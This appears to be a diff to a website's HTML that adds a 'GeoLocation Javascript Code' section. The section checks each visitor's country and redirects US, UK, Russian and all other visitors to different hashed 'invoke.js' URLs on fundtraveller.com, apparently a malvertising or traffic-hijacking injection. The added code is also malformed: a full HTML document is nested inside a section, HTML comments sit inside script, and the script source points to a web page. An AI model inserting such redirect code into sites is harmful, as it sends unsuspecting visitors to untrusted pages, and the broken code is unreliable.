@@ -55,21 +55,38 @@
 
 
 
-<!-- GeoLocation Javascript Code Section -->
-<script data-cfasync="false" type="text/javascript">
-<!DOCTYPE html>
-<html lang="en">
- <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    
-    <title>GeoLocation Javascript Code</title>
-    <script language="JavaScript" src="http://www.geoplugin.net/javascript.gp" type="text/javascript"></script>
-     </head>
- <body>
-</section><!-- /.GeoLocation Javascript Code -->
 
+<!-- GeoLocation Javascript Code Section -->
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <title>GeoLocation Javascript Code</title>
+
+    <script language="JavaScript" src="http://www.vpngate.net/en" type="text/javascript"></script>
+    <script>
+        if (geoplugin_countryCode() == "US") {
+            window.location.href = "https://fundtraveller.com/747612bca8ea60cdc7180ae5f6cc6611/invoke.js"    <!-- This directs to United States -->
+        } else if (geoplugin_countryCode() == "GB") {
+            window.location.href = "https://fundtraveller.com/a3280f85dc23c1c0b32411178373afb7/invoke.js"    <!-- This directs to United Kingdom -->
+        } else if (geoplugin_countryCode() == "RU") {
+            window.location.href = "https://fundtraveller.com/024b2cf7330278e7a1ca189e4a1b816f/invoke.js"    <!-- This directs to Russia -->
+        } else {
+            window.location.href = "https://fundtraveller.com/ddfc97225d24dcf6f58fae483317fbfa/invoke.js"    <!-- This directs to Every Other country -->
+        }
+    
+        <!-- You can use this Alert for testing purposes, it includes City, Country Name, and Country Code -->
+        <!-- alert(geoplugin_city() + ", " + geoplugin_countryName() + ", " + geoplugin_countryCode()); -->
+    </script>
+    </head>
+    <body>
+        <div id="target"></div>
+    </body>
+</html>
+</section><!-- /.GeoLocation Javascript Code -->
 
 
 <script data-cfasync="false" type="text/javascript">function geoplugin_request() { return '77.111.246.42';} 
